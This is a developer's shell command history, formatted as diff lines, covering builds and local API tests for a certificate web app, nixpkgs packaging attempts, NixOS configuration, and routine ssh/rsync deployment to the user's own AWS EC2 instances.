+curl -X POST http://localhost:3000/signature \<\n>  -H "Content-Type: application/json" \<\n>  -d '{<\n>    "societyId": "your-society-id",<\n>    "role": "instructor",<\n>    "file": "base64-encoded-file-content",<\n>    "fileName": "signature.png"<\n>  }'
+curl -X POST "http://localhost:3000/signature \<\n>  -H "Content-Type: application/json" \<\n>  -d '{<\n>    "societyId": "your-society-id",<\n>    "role": "instructor",<\n>    "file": "base64-encoded-file-content",<\n>    "fileName": "signature.png"<\n>  }'"
+node signatures.js
+curl -X POST http://localhost:5001/society -H "Content-Type: application/json" -d '{"schoolName":"Test School","schoolLicense":"LICENSE123","licenseValidUntil":"2025-12-31","writerName":"John Doe","instructorName":"Jane Smith"}'
+curl -X POST http://localhost:5001/signature -H "Content-Type: application/json" -d "{\"societyId\":\"YOUR_SOCIETY_ID\",\"role\":\"instructor\",\"fileName\":\"sig.png\",\"file\":\"$(base64 -i signature.png)\"}"
+node signature.js
+curl -X POST http://localhost:5001/signature -H "Content-Type: application/json" -d "{\"societyId\":\"YOUR_SOCIETY_ID\",\"role\":\"instructor\",\"fileName\":\"sig.png\",\"file\":\"$(base64 -i signature.png)\"}"
+node signature.js
+cd ~/projects/freelance/certiapp/anxj/api
+cd ~/.config/ghostty
+ls
+hx .
+cd ~/projects/freelance/certiapp/
+zeditor .
+node enrollment.js<\n>
+npx shadcn@latest add calendar
+npx shadcn@latest add popover
+deno run dev
+npm install sqlite3 path fs
+npm u fs
+npm i fs
+npm install sqlite3 path fs
+npm uninstall date-fns react-day-picker
+npm install date-fns@3.0.0 react-day-picker@8.10.1
+npm install sqlite3 path fs --legacy-peer-deps
+npm install better-sqlite3 path fs --legacy-peer-deps
+npm install sqlite3 path fs --force
+npm i date-fns react-day-picker
+npm i fs
+npm i react-day-picker
+npm fund
+npm i react-day-picker
+npm install react-day-picker
+npm i fs --force
+npm i fs
+deno run dev
+node signature.js
+ls
+node signature.js
+node Form14Service.js
+deno run dev
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "added" 
+git push
+cd ~/.config/hypr
+ls
+hx .
+reboot
+cd ~/projects/freelance/certiapp/
+hx .
+cd /etc/nixos
+sudop hx .
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+sudo hx .
+sudo nixos-rebuild switch
+reoot
+reboot
+ls
+cd ~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/pi
+cd ~/projects/freelance/certiapp/anxj/api/
+zeditor .
+deno run build
+code .
+node run build
+npm run build
+zeditor .
+npm run build
+git add .
+git commit -m "typefix" 
+git push
+cd ~/projects/freelance/certiapp/anxj/api/
+cd ~/projects/freelance/certiapp/
+zeditor .
+deno run build
+deno run dev
+node enrollment.js<\n>
+deno run dev
+node enrollment.js<\n>
+deno run dev
+npm run build
+deno run dev
+git add .
+git commit -m "typefix" 
+git push
+node enrollment.js<\n>
+deno run dev
+deno run build
+git add .
+git commit -m "typefix" 
+git push
+npm run build
+cd ~/projects/clones/nixpkgs/pkgs/development/python-modules/miniforge/
+gh pr checkout 368381
+git stash
+gh pr checkout 368381
+nix-build -A miniforge
+thunar .
+cd ../..
+cd ~/projects/clones/nixpkgs/pkgs/by-name/mi/miniforge/package.ni
+cd ~/projects/clones/nixpkgs/pkgs/by-name/mi/miniforge/
+ls
+thunar .
+nix-build -A miniforge
+ls
+thunar .
+nix-build -A miniforge
+zeditor .
+nix-build -A miniforge
+nixfmt default.nix
+nix-build -A miniforge
+nixfmt default.nix
+nix-build -A miniforge
+nixfmt default.nix
+nix-build -A miniforge
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nix-build -A miniforge
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nix-build -A miniforge<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+tree result<\n>
+nixfmt default.nix
+./result/bin/miniforge-conda --version<\n>
+ls -l ./result/bin/miniforge-conda<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+./result/bin/miniforge-conda --version<\n>
+ls -l ./result/bin/miniforge-conda<\n>
+./result/bin/miniforge-conda --version<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+./result/bin/miniforge-conda --version<\n>
+ls -l ./result/bin/miniforge-conda<\n>
+./result/bin/miniforge-conda --version<\n>
+nix-build -A conda-shell<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nix-locate conda<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { deepin-gettext-tools = pkgs.deepin-gettext-tools; }'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { deepin-gettext-tools = pkgs.deepin-gettext-tools; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; }'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; glib = pkgs.glib; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; glib = pkgs.glib; libxcrypt = pkgs.libxcrypt; }'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; glib = pkgs.glib; libxcrypt = pkgs.libxcrypt; }'<\n>
+nix-prefetch-url --unpack https://github.com/linuxdeepin/deepin-pw-check/archive/refs/tags/6.0.2.tar.gz<\n>
+nix-build --argstr vendorHash "sha256-PLACEHOLDER" --show-trace<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; glib = pkgs.glib; libxcrypt = pkgs.libxcrypt; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; glib = pkgs.glib; libxcrypt = pkgs.libxcrypt; gtk3 = pkgs.gtk3; iniparser = pkgs.iniparser; cracklib = pkgs.cracklib; linux-pam = pkgs.linux-pam; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; glib = pkgs.glib; libxcrypt = pkgs.libxcrypt; gtk3 = pkgs.gtk3; iniparser = pkgs.iniparser; cracklib = pkgs.cracklib; linux-pam = pkgs.linux-pam; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; glib = pkgs.glib; libxcrypt = pkgs.libxcrypt; }'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { pkg-config = pkgs.pkg-config; deepin-gettext-tools = pkgs.deepin-gettext-tools; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { apple-sdk_11 = pkgs.apple-sdk_11; }'<\n>
+cd ..
+cd wa
+cd watchman/
+ls
+hx .
+zeditor .
+nixfmt default.nix
+nixfmt package.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { apple-sdk_11 = pkgs.apple-sdk_11; }'<\n>
+ls
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix { apple-sdk_11 = pkgs.apple-sdk_11; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix { apple-sdk_11 = pkgs.apple-sdk_11; darwinMinVersionHook = pkgs.darwinMinVersionHook; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix { apple-sdk_11 = pkgs.apple-sdk_11; darwinMinVersionHook = pkgs.darwinMinVersionHook "11.0"; }'<\n>
+nix search nixpkgs libunwind<\n>nix search nixpkgs boost<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix { apple-sdk_11 = pkgs.apple-sdk_11; darwinMinVersionHook = pkgs.darwinMinVersionHook "11.0"; }'<\n>
+pip
+pip3
+nix-shell -p pip
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch
+ppi
+pip
+cd ~/projects/freelance/certiapp/
+clear
+cd ~/projects/freelance/certiapp/anxj/api/
+zeditor .
+deno run build
+node
+npm run build
+bun run dev
+cd ~/projects/freelance/certiapp/
+bun run dev
+cd ~/projects/freelance/certiapp/
+bun run build
+cd /etc/nixos
+sudo nixos-rebuild switch --upgrade<\n>
+sudo nixos-rebuild switch --upgrade<\n>nix flake update<\n>
+cd /etc/nixos
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+sudo nix-collect-garbage -d<\n>
+ls
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+reboot
+nu --version
+cd /
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+sudo hx .
+cd /etc/nixos
+zeditor .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+nix flake update<\n>
+sudo nix flake update<\n>
+cd /
+cd /etc/nixos
+cd ~/.config/ghostty/
+ls
+hx .
+ls
+cd ~/.config/ghostty/
+hx .
+ls
+cd ~/.config/ghostty/
+hx .
+ls
+cd ~/.config/ghostty/
+hx .
+:q
+:wq
+c;ear
+clear
+yazi
+cd ~/.config/ghostty/
+hx .
+cd /etc/nixos
+sudo hx .
+cd ~/.config/ghostty/
+ls
+hx .
+cd ~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/anxj/api/
+zeditor .
+bun run build
+git add .
+git commit -m "typefix" 
+git push
+node enrollment.js<\n>
+cd ~/projects/clones/nixpkgs/pkgs/by-name/mi/miniforge/
+ls
+nixpkgs-review pr 369352
+cd ~/projects/clones/nixpkgs/
+gh pr checkout 368381
+git status
+git pull origin 368381
+git branch
+git pull origin master
+git pull origin master --depth~1
+git pull origin master --depth1
+git pull origin master --depth-1
+git pull origin master --depth 1 <\n>
+gh pr checkout 369617
+cd ~/projects/clones/nixpkgs/
+gh pr checkout 368381
+npm i aws-sdk
+npm install dotenv @aws-sdk/client-s3 @aws-sdk/s3-request-presigner multer sqlite3
+node enrollment.js<\n>
+curl -X POST -H "Content-Type: multipart/form-data" \<\n>  -F "file=@/path/to/your/image.jpg" \<\n>  -F "title=Test Title" \<\n>  -F "description=Test Description" \<\n>  http://localhost:5000/records
+code .
+deno run dev
+nix-shell -p postgresql postgresql-contrib
+node enrollment.js<\n>
+nix-shell
+git add . 
+git commit -m "typefix" 
+git push
+git add . 
+git commit -m "typefix" 
+git push
+git add . 
+git commit -m "typefix" 
+git push
+cd /etc/nixos
+cd ~/etc/nixos
+ls
+cd ~/etc/nixos
+cd /etc/nixos
+cd ~
+cd /etc/nixos
+node enrollment.js<\n>
+npm install qrcode.react @radix-ui/react-textarea
+npm install qrcode.react @radix-ui/react-textarea date-fns jspdf
+npx shadcn-ui@latest add button input label card textarea
+npx shadcn@latest add button input label card textarea
+npm install qrcode.react @radix-ui/react-textarea date-fns jspdf
+npm install @radix-ui/react-text-area
+npm install qrcode.react
+npm uninstall qrcode.react<\n>npm install qrcode.react@3.1.0
+npm install react-qr-code
+neofetch
+nmcli device wifi connect "hmm"
+nmcli device wifi
+nmcli device wifi connect "hmm"
+cd ~/projects/clones/
+git clone https://git.sr.ht/~whynothugo/pimsync
+cd pimsync/
+ls
+cd ..
+cd nixpkgs/
+nmcli device wifi
+nmcli device wifi connect "Panchsheel_Niwas 5G"
+ls
+cd pkgs/applications/misc/pimsync
+cd pkgs/applications/misc/
+ls
+mkdir pimsync
+cd pimsync/
+hx default.nix
+nixfmt default.nix
+nix-build -A pimsync
+nix-build . -A pimsync
+cd ..
+nix-build . -A pimsync
+nix-build -A pimsync
+cd pimsync/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+zeditor .
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+~/projects/clones/nixpkgs/pkgs/applications/misc/pimsync> nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n><\n>this derivation will be built:<\n>  /nix/store/skr3b6fvskh79bphkdm4vfbfw0vws4m0-pimsync-0.1.0.drv<\n>building '/nix/store/skr3b6fvskh79bphkdm4vfbfw0vws4m0-pimsync-0.1.0.drv'...<\n>Sourcing python-remove-tests-dir-hook<\n>Sourcing python-catch-conflicts-hook.sh<\n>Sourcing python-remove-bin-bytecode-hook.sh<\n>Sourcing pypa-build-hook<\n>Using pypaBuildPhase<\n>Sourcing python-runtime-deps-check-hook<\n>Using pythonRuntimeDepsCheckHook<\n>Sourcing pypa-install-hook<\n>Using pypaInstallPhase<\n>Sourcing python-imports-check-hook.sh<\n>Using pythonImportsCheckPhase<\n>Sourcing python-namespaces-hook<\n>Sourcing python-catch-conflicts-hook.sh<\n>Running phase: unpackPhase<\n>unpacking source archive /nix/store/7s43in7ff242fpn188r40vf2q8w9cfyd-source<\n>source root is source<\n>setting SOURCE_DATE_EPOCH to timestamp 315619200 of file source/www/index.html<\n>Running phase: patchPhase<\n>Running phase: updateAutotoolsGnuConfigScriptsPhase<\n>Running phase: configurePhase<\n>no configure script, doing nothing<\n>Running phase: buildPhase<\n>Executing pypaBuildPhase<\n>Creating a wheel...<\n>pypa build flags: --no-isolation --outdir dist/ --wheel<\n>ERROR Source /build/source does not appear to be a Python project: no pyproject.toml or setup.py<\n>error: builder for '/nix/store/skr3b6fvskh79bphkdm4vfbfw0vws4m0-pimsync-0.1.0.drv' failed with exit code 1;<\n>       last 25 log lines:<\n>       > Sourcing python-catch-conflicts-hook.sh<\n>       > Sourcing python-remove-bin-bytecode-hook.sh<\n>       > Sourcing pypa-build-hook<\n>       > Using pypaBuildPhase<\n>       > Sourcing python-runtime-deps-check-hook<\n>       > Using pythonRuntimeDepsCheckHook<\n>       > Sourcing pypa-install-hook<\n>       > Using pypaInstallPhase<\n>       > Sourcing python-imports-check-hook.sh<\n>       > Using pythonImportsCheckPhase<\n>       > Sourcing python-namespaces-hook<\n>       > Sourcing python-catch-conflicts-hook.sh<\n>       > Running phase: unpackPhase<\n>       > unpacking source archive /nix/store/7s43in7ff242fpn188r40vf2q8w9cfyd-source<\n>       > source root is source<\n>       > setting SOURCE_DATE_EPOCH to timestamp 315619200 of file source/www/index.html<\n>       > Running phase: patchPhase<\n>       > Running phase: updateAutotoolsGnuConfigScriptsPhase<\n>       > Running phase: configurePhase<\n>       > no configure script, doing nothing<\n>       > Running phase: buildPhase<\n>       > Executing pypaBuildPhase<\n>       > Creating a wheel...<\n>       > pypa build flags: --no-isolation --outdir dist/ --wheel<\n>       > ERROR Source /build/source does not appear to be a Python project: no pyproject.toml or setup.py<\n>       For full logs, run 'nix log /nix/store/skr3b6fvskh79bphkdm4vfbfw0vws4m0-pimsync-0.1.0.drv'.<\n>~/projects/clones/nixpkgs/pkgs/applications/misc/pimsync>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+clear
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nixfmt default.nix
+zeditor .
+git add .
+git commit -m "typefix" 
+git push
+cd ~/projects/clones/nixpkgs/
+gh pr checkout 369933
+git fetch --depth 1 origin 369933<\n>
+git fetch origin 369933<\n>
+gh
+gh pr checkout 369933
+cd pkgs/applications/misc/
+cd pimsync/
+ls
+zeditor .
+nixfmt default.nix
+zeditor .
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+cd /etc/nixos
+cd ~
+$nu.env-path
+hx /home/chikoyeat/.config/nushell/env.nu
+cd /home/chikoyeat/.config/nushell/
+hx .
+$nu.config-path
+hx /home/chikoyeat/.config/nushell/config.nu
+cd /etc/nixos
+ls
+cd ..
+cd ~/projects/freelance/certiapp/anxj/api/
+cd ..
+ls
+cd src-tauri/
+ls
+cd ..
+ls
+cd ..
+ls
+cd bootlader/
+ls
+cd ..
+cd ~
+cd ~/.config/ghostty/
+ls
+hx .
+ls
+cd ~/.config/ghostty/
+ls
+ghostty +list-themes
+cd ~/.config/ghostty/
+hx .
+hx .
+npm run dev
+cd ~/projects/freelance/certiapp/anxj/api/
+cd ~/projects/freelance/certiapp/
+cd /etc/nixos
+ls
+hx .
+:wq
+cd /home/chikoyeat/.config/nushell/
+hx .
+ls
+emacs
+cd ~/projects/freelance/certiapp/
+cd src
+ls
+cd app
+xat page.tsx
+cat page.tsx
+cd ~/projects/freelance/certiapp/
+ls
+cd ~/.config/ghostty/
+hx .
+hx .
+hkk
+cd ~/.config/ghostty/
+hx .
+cd ~/.config/hypr
+hx .
+nix search nixpkgs pimsync
+npx shadcn@latest add dialog
+git add .
+git commit -m "typefix" 
+git push
+docker build -t enrollment-app .
+sudo groupadd docker<\n>sudo usermod -aG docker $USER<\n>newgrp docker
+cd ~/projects/freelance/certiapp/
+sudo groupadd docker<\n>sudo usermod -aG docker $env.USER<\n>newgrp docker
+docker build -t enrollment-app .
+npm run build
+docker run -p 3000:3000 enrollment-app
+node enrollment.js<\n>
+docker run -p 3000:3000 enrollment-app
+deno run dev
+git add .
+git commit -m "typefix" 
+git push
+deno run dev
+deno run build
+git add .
+git commit -m "fixedtype val" 
+git push
+npm run build
+ssh -i "india-mnv-free.pem" ubuntu@ec2-13-60-21-147.eu-north-1.compute.amazonaws.com
+cd Downloads/
+ssh -i "india-mnv-free.pem" ubuntu@ec2-13-60-21-147.eu-north-1.compute.amazonaws.com
+mkdir ~/.ssh
+cd ~/.ssh
+cd Downloads/
+cd ~/Downloads/
+mv india-mnv-free.pem ~/.ssh
+cd ~/.ssh
+ssh -i "india-mnv-free.pem" ubuntu@ec2-13-60-21-147.eu-north-1.compute.amazonaws.com
+nix-shell
+nixshell
+ssh -i "india-mnv-free.pem" ubuntu@ec2-13-60-21-147.eu-north-1.compute.amazonaws.com
+cd ~/.ssh
+chmod 400 "india-mnv-free.pem"
+ec2-13-60-21-147.eu-north-1.compute.amazonaws.com
+ssh -i "india-mnv-free.pem" ubuntu@ec2-13-60-21-147.eu-north-1.compute.amazonaws.com
+ssh
+ttps://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-prerequisites.html.
+chmod 400 "newappindia.pem"
+cd ~/Downloads/
+mv newappindia.pem ~/.ssh/
+cd ~/.ssh
+chmod 400 "newappindia.pem"
+ssh -i "newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ssh -i "newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+chmod 400 newappindia.pem<\n>
+ls
+ping ec2-13-61-104-77.eu-north-1.compute.amazonaws.com<\n>
+ssh -v -i "newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com<\n>
+ssh -i "newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ssh -i "~/.ssh/newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+thunar .
+chmod 400 "newinst.pem"
+ping ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+hx .
+hx note
+zeditor note
+zeditor .
+cd ~/.config/hypr
+hx .
+cd ~/projects/freelance/certiapp/
+docker run -p 3000:3000 enrollment-app
+deno run build
+docker build -t enrollment-app .
+docker run -p 3000:3000 enrollment-app
+sudo docker run -p 3000:3000 enrollment-app<\n>
+sudo lsof -i :3000<\n>
+cd anxj/api
+deno run dev
+zeditor .
+cd ~/projects/freelance/certiapp/
+cd ~/.config/ghostty/
+hx .
+cd ~/.config/ghostty/
+ls
+git add .
+git commit -m "fixedtype val" 
+git push
+cd /etc/nixos
+sudo nix flake update<\n>
+flatpak install flathub io.missioncenter.MissionCenter
+flatpak upgrade
+flatpak install flathub cc.arduino.IDE2
+flatpak uninstall missioncenter
+flatpak install flathub com.one_ware.OneWare
+cd ~/.config/hypr
+hx .
+node enrollment.js<\n>
+docker run -p 3000:3000 enrollment-app
+deno run dev
+ssh -i "~/.ssh/newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+cd ~/.ssh
+hx note
+zeditor .
+sudo docker run -p 3000:3000 enrollment-app<\n>
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' \<\n>-e "ssh -i ~/.ssh/newinst.pem" \<\n>.  ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com: ~/projects/freelance/certiapp/anxj/api/<\n>
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' \<\n>-e "ssh -i ~/.ssh/newinst.pem" \<\n>./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/anxj/api/
+hx ~/.ssh/newinst.pem
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' \ -e "ssh -i ~/.ssh/newinst.pem" \ ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/anxj/api/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/anxj/api/
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp/anxj/api"
+ssh -i "~/.ssh/newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+cd ~/.ssh
+ssh -i "~/.ssh/newappindia.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+cd ~/projects/freelance/certiapp/anxj/api/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/anxj/api/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp/"
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ..
+tree
+ls
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+cd ..
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ../ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ../ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+ls
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+cd certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+docker login
+zeditor .
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+cd ~/.ssh
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ssh -i "~/newinst.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ls
+ssh -i "newinst.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+cd ~/.ssh
+ssh -i "newinst.pem" ubuntu@ec2-13-61-104-77.eu-north-1.compute.amazonaws.com
+ssh -i "newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+chmod 400 "newinst.pem"
+ssh -i "newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+cd ~/projects/clones/nixpkgs/
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+ssh -i "newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+ls
+ssh -i "newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+gh pr checkout 369352
+cd ~/projects/freelance/certiapp/anxj/api/
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/anxj/api
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+cd ..
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/anxj/api
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-13-53-174-80.eu-north-1.compute.amazonaws.com
+ssh -i "newinst.pem" ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com
+ssh -i ~/.ssh/newinst.pem ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com "mkdir -p ~/projects/freelance/certiapp"
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd anxj/api
+reboot
+cd ~/projects/freelance/certiapp/anxj/api/
+cd ~/projects/freelance/certiapp
+npm run build
+cd ~/projects/freelance/certiapp
+zeditor .
+cd ~/.ssh
+node enrollment.js<\n>
+cd ..
+ls
+git add .
+git commit -m "fixedtype val" 
+git push
+git add .
+git commit -m "fixedtype val 1" 
+git push
+git add .
+git commit -m "fixedtype val x" 
+git push
+ssh -i "newinst.pem" ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com
+nix-shell -I nixpkgs=https://github.com/NixOS/nixpkgs/archive/release-24.11.tar.gz -p duckdb
+cd ~/projects/clones
+mkdir issues
+cd issues/
+hx shell.nix
